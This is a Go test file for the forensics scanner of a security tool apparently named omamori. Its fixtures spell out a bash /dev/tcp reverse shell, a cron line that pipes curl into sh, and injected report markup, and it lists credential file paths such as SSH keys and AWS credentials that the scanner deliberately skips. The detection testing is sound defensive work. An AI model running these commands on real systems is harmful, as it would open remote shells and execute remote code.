package forensics

import (
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/kenzietann/omamori/internal/event"
	"github.com/kenzietann/omamori/internal/filerules"
	"github.com/kenzietann/omamori/internal/indicators"
	"github.com/kenzietann/omamori/internal/reportwriter"
	"github.com/kenzietann/omamori/internal/rules"
)

const reverseShell = "#!/bin/sh\nbash -i >& /dev/tcp/203.0.113.80/4444 0>&1\n"

func evidence(t *testing.T, files map[string]string) string {
	t.Helper()
	root := filepath.Join(t.TempDir(), "root")
	for name, text := range files {
		full := filepath.Join(root, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(full), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(text), 0o600); err != nil {
			t.Fatal(err)
		}
		os.Chtimes(full, day(), day())
	}

	return root
}

func scanRun(t *testing.T, root string, options Options) Result {
	t.Helper()
	set, err := rules.BuiltinForensics()
	if err != nil {
		t.Fatal(err)
	}
	if options.FileRules == nil {
		files, err := filerules.Builtin()
		if err != nil {
			t.Fatal(err)
		}
		options.FileRules = &files
	}
	options.Year, options.Location = 2026, tokyo
	result, err := Run(root, set, "built-in", options, day().Add(30*time.Hour))
	if err != nil {
		t.Fatal(err)
	}

	return result
}

func alertNames(result Result) []string {
	var names []string
	for _, alert := range result.Outcome.Result.Alerts {
		names = append(names, alert.Rule.Name+" "+alert.Events[0].Ref)
	}

	return names
}

func TestAHitIsAnAlertWithTheHashOfTheManifest(t *testing.T) {
	root := evidence(t, map[string]string{"var/tmp/.dbus/helper": reverseShell, "etc/hostname": "web01\n"})
	result := scanRun(t, root, Options{})
	if got := strings.Join(alertNames(result), ","); got != "file_reverse_shell var/tmp/.dbus/helper" {
		t.Fatalf("alerts: %s", got)
	}
	alert := result.Outcome.Result.Alerts[0]
	fields := alert.Events[0].Fields
	sum := sha256.Sum256([]byte(reverseShell))
	if fields["sha256"] != hex.EncodeToString(sum[:]) || fields["file"] != "/var/tmp/.dbus/helper" || fields[TimeField] != TimeFileChange ||
		fields["matched"] != "dev_tcp" || fields["excerpt"] != "bash -i >& /dev/tcp/203.0.113.80/4444" || alert.Rule.Level != "high" || alert.Rule.Title != "File holds a reverse shell" {
		t.Fatalf("fields %v, rule %+v", fields, alert.Rule)
	}
	if !alert.Time.Equal(day()) {
		t.Errorf("the time is %v, want the last change of the file", alert.Time)
	}
	entries := map[string]Entry{}
	for _, entry := range result.Manifest.Entries {
		entries[entry.Path] = entry
	}
	if entries["var/tmp/.dbus/helper"].SHA256 != fields["sha256"] || entries["var/tmp/.dbus/helper"].Events != 1 || entries["etc/hostname"].Kind != KindScanned {
		t.Fatalf("manifest: %+v", entries)
	}
	differences, checked, err := Verify(root, []byte(result.ManifestText))
	if err != nil || len(differences) != 0 || checked != 2 {
		t.Fatalf("verify: %v %d %v", differences, checked, err)
	}
}

// Files with password hashes, keys and credentials are not opened by the file rules, even when they hold text
// that a rule would find: they are not hashed, not listed, not named.
func TestTheScanNeverOpensSecrets(t *testing.T) {
	secrets := []string{
		"etc/shadow", "etc/gshadow", "etc/ssh/ssh_host_ed25519_key", "etc/ssl/private/site.key", "root/.ssh/id_rsa", "root/.ssh/config",
		"home/aiko/.aws/credentials", "home/aiko/.gnupg/private.asc", "home/aiko/.netrc", "home/aiko/.git-credentials", "srv/app/.env",
		"srv/app/.env.production", "home/aiko/cert.pem", "home/aiko/.kube/config", "home/aiko/.docker/config.json", "home/aiko/.config/gcloud/token",
		"home/aiko/vault.kdbx", "home/aiko/.pgpass", "tmp/id_ed25519",
	}
	files := map[string]string{"tmp/ok.sh": reverseShell}
	for _, name := range secrets {
		files[name] = reverseShell + "canarysecret\n"
	}
	result := scanRun(t, evidence(t, files), Options{})
	if got := strings.Join(alertNames(result), ","); got != "file_reverse_shell tmp/ok.sh" {
		t.Fatalf("alerts: %s", got)
	}
	for _, name := range secrets {
		if strings.Contains(result.ManifestText, name) {
			t.Errorf("the manifest names %s", name)
		}
	}
	if strings.Contains(Markdown(result), "canarysecret") {
		t.Error("the report has the content of a secret")
	}
}

func TestTheScanFollowsNoLink(t *testing.T) {
	outside := filepath.Join(t.TempDir(), "outside")
	os.MkdirAll(outside, 0o700)
	os.WriteFile(filepath.Join(outside, "shell.sh"), []byte(reverseShell), 0o600)
	root := evidence(t, map[string]string{"etc/hostname": "web01\n"})
	os.MkdirAll(filepath.Join(root, "tmp"), 0o700)
	if err := os.Symlink(filepath.Join(outside, "shell.sh"), filepath.Join(root, "tmp", "file")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(root, "tmp", "folder")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(root, "home")); err != nil {
		t.Fatal(err)
	}
	result := scanRun(t, root, Options{})
	if len(result.Outcome.Result.Alerts) != 0 || strings.Contains(result.ManifestText, "shell.sh") || len(result.Manifest.Entries) != 1 {
		t.Fatalf("a link was followed: %v %s", alertNames(result), result.ManifestText)
	}
}

func TestPackageFoldersAreNamedAndPassedOver(t *testing.T) {
	root := evidence(t, map[string]string{
		"home/aiko/app/node_modules/x/install.js": "require('child_process'); // bash -i >& /dev/tcp/203.0.113.80/4444",
		"home/aiko/app/.git/hooks/post-merge":     reverseShell,
		"home/aiko/app/run.sh":                    reverseShell,
	})
	result := scanRun(t, root, Options{})
	if got := strings.Join(alertNames(result), ","); got != "file_reverse_shell home/aiko/app/run.sh" {
		t.Fatalf("alerts: %s", got)
	}
	skipped := strings.Join(result.Manifest.Skipped, "\n")
	for _, want := range []string{"home/aiko/app/node_modules: a folder of packages", "home/aiko/app/.git: a folder of packages"} {
		if !strings.Contains(skipped, want) {
			t.Errorf("not named: %s in %s", want, skipped)
		}
	}
	if result.Outcome.Result.Alerts[0].Events[0].Fields[event.User] != "aiko" {
		t.Error("the file in a home folder has no user")
	}
}

func TestAKnownHashIsFoundWithoutFileRules(t *testing.T) {
	sum := sha256.Sum256([]byte("a tool\n"))
	list, err := indicators.Parse([]byte("indicators:\n  - type: sha256\n    value: " + strings.ToUpper(hex.EncodeToString(sum[:])) + "\n"))
	if err != nil {
		t.Fatal(err)
	}
	root := evidence(t, map[string]string{"usr/local/bin/tool": "a tool\n", "usr/local/bin/other": "another tool\n"})
	set, err := rules.BuiltinForensics()
	if err != nil {
		t.Fatal(err)
	}
	result, err := Run(root, set, "built-in", Options{Year: 2026, Location: tokyo, Indicators: list}, day())
	if err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(alertNames(result), ","); got != "intel_indicator_seen usr/local/bin/tool" {
		t.Fatalf("alerts: %s", got)
	}
	// Every file that was read for its hash is in the manifest, with or without a finding.
	if !strings.Contains(result.ManifestText, `"path": "usr/local/bin/other"`) {
		t.Error("a file that was hashed is not in the manifest")
	}
}

func TestNoFileRulesAndNoListReadNoMoreFiles(t *testing.T) {
	root := evidence(t, map[string]string{"tmp/x.sh": reverseShell, "etc/passwd": "root:x:0:0:root:/root:/bin/bash\n"})
	set, err := rules.BuiltinForensics()
	if err != nil {
		t.Fatal(err)
	}
	result, err := Run(root, set, "built-in", Options{Year: 2026, Location: tokyo}, day())
	if err != nil || len(result.Manifest.Entries) != 1 || len(result.Outcome.Result.Alerts) != 0 {
		t.Fatalf("%v %+v", err, result.Manifest.Entries)
	}
}

// A cron script is read as an artifact and by the file rules. It keeps one entry, with the events of both.
func TestACronScriptKeepsOneEntry(t *testing.T) {
	root := evidence(t, map[string]string{"etc/cron.hourly/sync": "#!/bin/sh\ncurl -s http://203.0.113.80/u.sh | sh\n"})
	result := scanRun(t, root, Options{})
	if len(result.Manifest.Entries) != 1 || result.Manifest.Entries[0].Kind != KindCronJob || result.Manifest.Entries[0].Events != 2 {
		t.Fatalf("entries: %+v", result.Manifest.Entries)
	}
	if got := strings.Join(alertNames(result), ","); got != "file_download_and_run etc/cron.hourly/sync" {
		t.Fatalf("alerts: %s", got)
	}
}

func TestAFileTooBigIsCountedAndNotRead(t *testing.T) {
	root := evidence(t, map[string]string{"tmp/small.sh": reverseShell})
	big, err := os.Create(filepath.Join(root, "tmp", "big.iso"))
	if err != nil {
		t.Fatal(err)
	}
	big.Truncate(maxScanFileBytes + 1)
	big.Close()
	result := scanRun(t, root, Options{})
	if !strings.Contains(strings.Join(result.Manifest.Skipped, "\n"), "1 files over 64 MB were not looked at") || strings.Contains(result.ManifestText, "big.iso\"") {
		t.Fatalf("skipped: %v", result.Manifest.Skipped)
	}
	if len(result.Outcome.Result.Alerts) != 1 {
		t.Fatal("the small file was not looked at")
	}
}

func TestOnlyTheFirstPartOfALongFileIsLookedAt(t *testing.T) {
	long := strings.Repeat("x", filerules.MaxScanBytes) + reverseShell
	root := evidence(t, map[string]string{"tmp/long.log": long})
	result := scanRun(t, root, Options{})
	if len(result.Outcome.Result.Alerts) != 0 || !strings.Contains(result.Manifest.Entries[0].Note, "looked at the first") {
		t.Fatalf("alerts %v, entry %+v", alertNames(result), result.Manifest.Entries[0])
	}
	sum := sha256.Sum256([]byte(long))
	if result.Manifest.Entries[0].SHA256 != hex.EncodeToString(sum[:]) {
		t.Error("the hash is not of the whole file")
	}
}

// The name and the content of a file come from the attacker. They stay text in a cell of the report.
func TestHostileFileNamesAndContentStayText(t *testing.T) {
	root := evidence(t, map[string]string{
		"tmp/a\n| injected | row |\nb.sh": reverseShell,
		"tmp/c.sh":                        "#!/bin/sh\nbash -i >& /dev/tcp/203.0.113.80/4444\x1b]0;evil\x07 <script>alert(1)</script>\n",
	})
	result := scanRun(t, root, Options{})
	if len(result.Outcome.Result.Alerts) != 2 {
		t.Fatalf("alerts: %v", alertNames(result))
	}
	report := Markdown(result)
	if strings.Contains(report, "\n| injected | row |") || strings.Contains(report, "\x1b") || strings.Contains(report, "<script>") {
		t.Error("the report carries the name or the content as it is")
	}
}

// Found in the live test: gigabytes of projects in a home folder used up the limit of the scan before the
// web folder was looked at, and a web shell was missed. The places of the system come before the homes.
func TestHomesAreLookedAtLast(t *testing.T) {
	position := map[string]int{}
	for index, folder := range scanFolders {
		position[folder] = index
	}
	for _, system := range []string{"tmp", "var/tmp", "dev/shm", "var/www", "srv", "etc", "opt", "usr/local/bin"} {
		if position[system] > position["home"] || position[system] > position["root"] {
			t.Errorf("%s is looked at after the homes", system)
		}
	}
	if scanFolders[len(scanFolders)-1] != "home" {
		t.Error("home is not the last place")
	}
}

// Found in the live test: a manifest of the full scan was larger than one file of a report could be, and the
// run stopped after the report was written and before the manifest was. A full scan with long paths fits now.
func TestAFullScanManifestFitsTheLimits(t *testing.T) {
	manifest := Manifest{Version: ManifestVersion, Skipped: []string{}}
	long := strings.Repeat("a", 255)
	for index := 0; index < maxScanFiles+2000; index++ {
		manifest.Entries = append(manifest.Entries, Entry{Path: "home/" + long + "/" + long, Kind: KindScanned, Size: 1 << 20, Mode: "-rw-r--r--",
			Modified: time.Now().UTC().Format(time.RFC3339), SHA256: strings.Repeat("f", 64), Events: 1, Note: "the file rules looked at the first 8388608 bytes"})
	}
	text, _, err := manifest.JSON()
	if err != nil || len(text) > MaxManifestBytes {
		t.Fatalf("a full manifest is %d bytes, the limit is %d", len(text), MaxManifestBytes)
	}
}

func TestATooLargeManifestStopsTheRunBeforeAnyReport(t *testing.T) {
	root := evidence(t, map[string]string{"tmp/a.sh": reverseShell, "tmp/b.txt": "notes\n"})
	manifestLimit = 200
	defer func() { manifestLimit = MaxManifestBytes }()
	set, err := rules.BuiltinForensics()
	if err != nil {
		t.Fatal(err)
	}
	files, _ := filerules.Builtin()
	if _, err := Run(root, set, "built-in", Options{Year: 2026, Location: tokyo, FileRules: &files}, day()); !errors.Is(err, ErrTooBig) {
		t.Fatalf("got %v, want ErrTooBig", err)
	}
}

// The writer of reports must take a manifest of the largest size that a run makes, or a run would stop after
// the report and before the manifest.
func TestTheReportWriterTakesTheLargestManifest(t *testing.T) {
	base := t.TempDir()
	writer, err := reportwriter.NewRun([]string{filepath.Join(base, "evidence")}, filepath.Join(base, "out"))
	if err != nil {
		t.Fatal(err)
	}
	if err := writer.Write("manifest.json", strings.Repeat("a", MaxManifestBytes)); err != nil {
		t.Fatalf("a manifest of the largest size was refused: %v", err)
	}
}
